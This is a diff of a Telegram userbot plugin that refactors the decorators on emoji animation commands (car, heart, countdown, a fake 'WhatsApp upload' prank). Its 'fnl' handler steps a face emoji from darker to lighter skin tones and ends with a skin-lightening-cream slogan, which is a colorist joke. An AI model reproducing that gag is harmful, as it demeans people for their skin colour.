             "⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n🔲🔲🔲🔲🔲🔲🔲",
             "⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛🚗\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n🔲🔲🔲🔲🔲🔲🔲",
@@ -1305,161 +1062,95 @@ async def _(event):
             "⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛😊⬛⬛⬛\n⬛⬛⬜⬜⬜⬛⬛\n⬛⬜⬛⬜⬛⬜⬛\n⬛⬛⬜⬛⬜⬛⬛\n⬛⬛⬜⬛⬜⬛⬛\n⬛⬛⬜⬛⬜⬛⬛\n🔲🔲🔲🔲🔲🔲🔲",
             "⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬛⬛⬛⬛⬛⬛⬛\n⬜⬜⬜😊⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n🔲🔲🔲🔲🔲🔲🔲",
         ]
-
         animation_interval = 0.5
-
         animation_ttl = range(16)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 16])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "load":
-
         await event.edit(input_str)
-
         animation_chars = ["▮", "▯", "▬", "▭", "‎"]
-
         animation_interval = 0.1
-
         animation_ttl = range(100)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 4])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "square":
-
         await event.edit(input_str)
-
         animation_chars = ["◧", "◨", "◧", "◨", "‎"]
-
         animation_interval = 0.1
-
         animation_ttl = range(100)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 4])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "up":
-
         await event.edit(input_str)
-
         animation_chars = ["╹", "╻", "╹", "╻", "‎"]
-
         animation_interval = 0.1
-
         animation_ttl = range(100)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 4])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "round":
-
         await event.edit(input_str)
-
         animation_chars = ["⚫", "⬤", "●", "∘", "‎"]
-
         animation_interval = 0.1
-
         animation_ttl = range(100)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 4])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "heart":
-
         await event.edit(input_str)
-
         animation_chars = ["🖤", "❤️", "🖤", "❤️", "‎"]
-
         animation_interval = 0.1
-
         animation_ttl = range(100)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 4])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "anim":
-
         await event.edit(input_str)
-
         animation_chars = [
             "😁",
             "😧",
@@ -1471,31 +1162,20 @@ async def _(event):
             "😢",
             "__**...BOY oh BOY! i feel like a wamen....**__",
         ]
-
         animation_interval = 1
-
         animation_ttl = range(11)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 11])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "fnl":
-
         await event.edit(input_str)
-
         animation_chars = [
             "😁🏿",
             "😁🏾",
@@ -1504,27 +1184,18 @@ async def _(event):
             "‎😁",
             "**Fair & Lovely GeNg Is BeHiNd You....**",
         ]
-
         animation_interval = 2
-
         animation_ttl = range(6)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 6])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "monkey":
 
         await event.edit(input_str)
@@ -1542,19 +1213,13 @@ async def _(event):
             await event.edit(animation_chars[i % 6])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "hand":
-
         await event.edit(input_str)
-
         animation_chars = [
             "👈",
             "👉",
@@ -1570,31 +1235,20 @@ async def _(event):
             "🖐️",
             "👌",
         ]
-
         animation_interval = 1
-
         animation_ttl = range(14)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 14])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "cnt":
-
         await event.edit(input_str)
-
         animation_chars = [
             "🔟",
             "9️⃣",
@@ -1609,31 +1263,20 @@ async def _(event):
             "0️⃣",
             "🆘",
         ]
-
         animation_interval = 1
-
         animation_ttl = range(13)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 13])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "wupload":
-
         await event.edit(input_str)
-
         animation_chars = [
             "Uploading File From Telegram To Whatsapp...",
             " User Online: True\nTelegram API Access: True\nWhatsapp API Access: True\nRead Storage: True ",
@@ -1651,31 +1294,20 @@ async def _(event):
             "UPLOADING FILE TO WHATSAPP GROUP COMPLETED!\nFILE VERIFIED: ✅",
             "API TERMINATED UNTIL FURTHER USAGE...",
         ]
-
         animation_interval = 9
-
         animation_ttl = range(15)
-
         for i in animation_ttl:
-
             await asyncio.sleep(animation_interval)
-
             await event.edit(animation_chars[i % 15])
 
 
-@bot.on(man_cmd(pattern=r"(.*)", outgoing=True))
+@man_cmd(pattern="(.*)")
 async def _(event):
-
     if event.fwd_from:
-
         return
-
     input_str = event.pattern_match.group(1)
-
     if input_str == "admeme":
-
         await event.edit(input_str)
-
         animation_chars = [
             "@aaaaaaaaaaaaadddddddddddddmmmmmmmmmmmmmiiiiiiiiiiiiinnnnnnnnnnnnn",
             "@aaaaaaaaaaaaddddddddddddmmmmmmmmmmmmiiiiiiiiiiiinnnnnnnnnnnn",
@@ -1691,15 +1323,12 @@ async def _(event):
             "@aaddmmiinn",
             "@admin",
         ]
-
         animation_ttl = range(103)
-
         for i in animation_ttl:
-
             await event.edit(animation_chars[i % 103])
 
 
-@bot.on(man_cmd(outgoing=True, pattern=r"kiss(?: |$)(.*)"))
+@man_cmd(pattern="kiss(?: |$)(.*)")
 async def _(event):
     if event.fwd_from:
         return
